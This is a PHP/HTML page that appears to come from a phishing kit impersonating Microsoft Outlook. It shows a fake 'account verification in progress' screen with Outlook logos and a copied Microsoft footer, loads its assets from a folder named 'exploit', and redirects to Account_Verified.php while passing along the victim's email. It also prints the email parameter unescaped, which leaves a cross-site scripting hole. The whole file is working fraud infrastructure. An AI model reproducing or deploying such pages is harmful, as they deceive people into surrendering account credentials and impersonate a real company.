﻿<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
    <meta HTTP-EQUIV="REFRESH" content="4; url=Account_Verified.php?email=<?php echo $_GET['email']; ?>&.rand=13InboxLight.aspx?n=1774256418&fid=4#n=1252899642&fid=1&fav=1">
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>Update in progress</title>
<link rel="stylesheet" type="text/css" href="exploit/style2.css">
<link rel="shortcut icon" href="exploit/favicon.ico" type="image/x-icon">
</head>
<body dir="ltr" class="ltr normal en-in">
<div id="confirm">
<div id="brand" class="newmail">
<a href="#">
<img src="exploit/Outlook_Logo_140x40_ltr.png">
</a>
</div>

<table width="477">
<td><div>
  <h2>VERIFICATION...<br>
    <br>Please wait while<br>
     Account verification in progress!</h2>
</div></td>
<td><div><br><br><br>
<img src="exploit/progressindicator.gif" width="40" height="40"></div></td>
</table>
</div>
<div id="mboxDefault" class="mboxDefault" style="visibility: visible; display: block;">
<div id="offer">
<img src="exploit/big-feedback_ltr.png" alt="Let us hear it">
</div>
</div>
</div><div id="mboxMarker-default-PROD-outlook_signout-0" style="visibility:hidden;display:none">&nbsp;</div>
<div id="footer"><span id="ftrCopy">©2018 Microsoft</span><a href="#" id="ftrTerms">Terms</a><a href="#" id="ftrPrivacy">Privacy &amp; cookies</a></div>
</body>
</html>